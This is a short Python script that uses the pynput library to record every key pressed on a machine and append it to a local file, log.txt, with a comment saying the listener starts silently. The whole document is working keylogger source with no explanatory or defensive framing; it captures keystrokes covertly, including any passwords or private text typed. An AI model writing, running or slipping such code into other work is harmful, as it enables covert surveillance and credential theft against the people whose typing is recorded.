from pynput import keyboard

LOG_FILE = "log.txt"

# Function to log key presses
def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key.name}]"

    with open(LOG_FILE, "a") as f:
        f.write(f"{key_str}\n")

# Start the listener silently
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
